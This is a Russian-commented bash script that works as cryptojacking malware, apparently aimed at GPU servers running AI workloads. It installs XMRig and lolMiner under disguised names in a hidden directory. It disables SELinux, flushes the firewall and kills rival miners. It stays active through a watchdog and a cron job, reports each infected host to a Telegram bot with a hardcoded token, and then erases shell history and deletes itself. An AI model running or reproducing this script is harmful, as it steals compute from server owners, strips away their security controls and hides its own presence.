#!/bin/bash


# [ ⚙️ КОНФИГУРАЦИЯ ]
FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

POOL_CPU="xmr.kryptex.network:7029"
POOL_GPU="etc.kryptex.network:7033"

# [ 🛡 РЕЗЕРВНЫЕ ПУЛЫ (BACKUP) ]
# Если криптекс отвалится, он переключится сюда
BACKUP_GPU="etc-eu.kryptex.network:7033"
BACKUP_CPU="xmr-eu.kryptex.network:7029"

# [ ПОРТЫ API ]
PORT_CPU=16000
PORT_GPU=8088

# [ ПУТЬ ]
if [ "$(id -u)" -eq 0 ]; then
    BASE_DIR="/usr/local/bin/.sys-core"
else
    BASE_DIR="$HOME/.sys-core"
fi
mkdir -p "$BASE_DIR"

BIN_CPU="sys_mngr" 
BIN_GPU="sys_rndr"

# ----------------------------------------------------
# [ ID ]
# ----------------------------------------------------
get_worker() {
    local ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me)
    local safe_ip=$(echo "$ip" | tr -d '.') 
    [ -z "$safe_ip" ] && safe_ip="AI_NODE"
    echo "${FIXED_WALLET_ID}.${safe_ip}"
}
WORKER=$(get_worker)

# ----------------------------------------------------
# [ ОПТИМИЗАЦИЯ ОС ]
# ----------------------------------------------------
optimize_system() {
    # SELinux OFF
    setenforce 0 2>/dev/null
    echo "SELINUX=disabled" > /etc/selinux/config 2>/dev/null

    # Файрвол OFF (чтобы майнинг шел)
    iptables -F 2>/dev/null
    iptables -X 2>/dev/null
    
    # HugePages (для CPU)
    sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1
    echo "1280" > /proc/sys/vm/nr_hugepages 2>/dev/null
}
optimize_system

# ----------------------------------------------------
# [ ЗАЧИСТКА (ТОЛЬКО КОНКУРЕНТЫ) ]
# ----------------------------------------------------
nuke_competitors() {
    echo "⚔️ KILLING COMPETITORS ONLY (Python SAFE)..."
    
    # Я УБРАЛ pkill python/llama/comfyui И УБРАЛ fuser -k /dev/nvidia
    # Теперь мы бьем только по именам известных майнеров
    
    TARGETS=("rigel" "t-rex" "nbminer" "xmrig" "lolminer" "gminer" "minerd" "bzminer" "cminer" "teamredminer" "danila-miner" "phoenixminer")
    for target in "${TARGETS[@]}"; do 
        pkill -9 -f "$target"
    done
    
    # Чистим старые копии нашего скрипта (рестарт)
    pkill -f "$BIN_CPU"
    pkill -f "$BIN_GPU"
    pkill -f "wd_service.sh"
}
nuke_competitors

# ----------------------------------------------------
# [ УСТАНОВКА (v1.98 for H100) ]
# ----------------------------------------------------
cd "$BASE_DIR" || exit

install_bins() {
    # --- CPU ---
    if [ ! -f "$BIN_CPU" ]; then
        curl -L -k -s -o cpu.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
        tar -xf cpu.tar.gz
        mv xmrig*/xmrig ./"$BIN_CPU"
        chmod +x ./"$BIN_CPU"
        rm -rf cpu.tar.gz xmrig*
    fi

    # --- GPU (lolMiner 1.98) ---
    if [ ! -f "$BIN_GPU" ]; then
        echo "[+] Getting lolMiner 1.98..."
        curl -L -k -s -o gpu.tar.gz "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz"
        mkdir -p tmp_gpu
        tar -xf gpu.tar.gz -C tmp_gpu
        FIND_BIN=$(find tmp_gpu -type f -name "lolMiner" | head -n 1)
        if [ -n "$FIND_BIN" ]; then
            mv "$FIND_BIN" ./"$BIN_GPU"
            chmod +x ./"$BIN_GPU"
        fi
        rm -rf gpu.tar.gz tmp_gpu
    fi
}
install_bins

# ----------------------------------------------------
# [ WATCHDOG ]
# ----------------------------------------------------
cat <<EOF > wd_service.sh
#!/bin/bash
cd "$BASE_DIR" || exit

USE_BACKUP_GPU=0
USE_BACKUP_CPU=0

while true; do
    # === CPU CHECK ===
    if ! pidof -x "$BIN_CPU" > /dev/null; then
        if [ \$USE_BACKUP_CPU -eq 0 ]; then C_POOL="$POOL_CPU"; else C_POOL="$BACKUP_CPU"; fi
        nohup ./$BIN_CPU -o \$C_POOL -u $WORKER -p x -k --cpu-priority 5 --http-enabled --http-host 127.0.0.1 --http-port $PORT_CPU --donate-level 1 --nicehash --randomx-1gb-pages >/dev/null 2>&1 &
    fi

    # === GPU CHECK ===
    if [ -f "./$BIN_GPU" ]; then
        if ! pidof -x "$BIN_GPU" > /dev/null; then
            if [ \$USE_BACKUP_GPU -eq 0 ]; then G_POOL="$POOL_GPU"; STRAT="ETCPROXY"; else G_POOL="$BACKUP_GPU"; STRAT="ETHPROXY"; fi
            
            # ВАЖНО: --keepfree 10 оставляем! 
            # Это заставит майнер не крашить систему, если ComfyUI сожрет память.
            nohup ./$BIN_GPU --algo ETCHASH --pool \$G_POOL --user $WORKER --ethstratum \$STRAT --apihost 127.0.0.1 --apiport $PORT_GPU --nocolor --watchdog exit --keepfree 10 --enablezilcache >/dev/null 2>&1 &
        else
            # ПРОВЕРКА НА ЗАВИСАНИЕ (HASH 0)
            STATS=\$(curl --max-time 10 -s http://127.0.0.1:$PORT_GPU/summary)
            if [ -n "\$STATS" ]; then
                 HASHRATE=\$(echo "\$STATS" | grep -o '"Performance": *[0-9.]*' | awk '{print \$2}' | cut -d. -f1)
                 if [[ "\$HASHRATE" == "0" ]]; then
                    # Если хешрейт 0, значит драйвер мог залипнуть из-за нагрузки AI
                    echo "Miner stalled (0 mh/s). Restarting miner only..."
                    killall -9 $BIN_GPU
                 fi
            fi
        fi
    fi

    # Зачистка "посторонних" процессов NVIDIA убрана,
    # так как они могут быть твоим ComfyUI

    sleep 20
done
EOF
chmod +x wd_service.sh

# ----------------------------------------------------
# [ ЗАПУСК ]
# ----------------------------------------------------
pkill -f "wd_service.sh"
nohup ./wd_service.sh >/dev/null 2>&1 &

# Persist
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v "wd_service.sh"; echo "* * * * * $BASE_DIR/wd_service.sh") | crontab -
fi

MSG="👹 <b>MINER (AI SAFE MODE)</b>%0AWorker: $WORKER%0A⚠️ <b>Warning:</b> Sharing GPU with Python processes!"
curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" -d chat_id="$TG_CHAT_ID" -d text="$MSG" -d parse_mode="HTML" >/dev/null 2>&1

history -c
rm -f "$0"
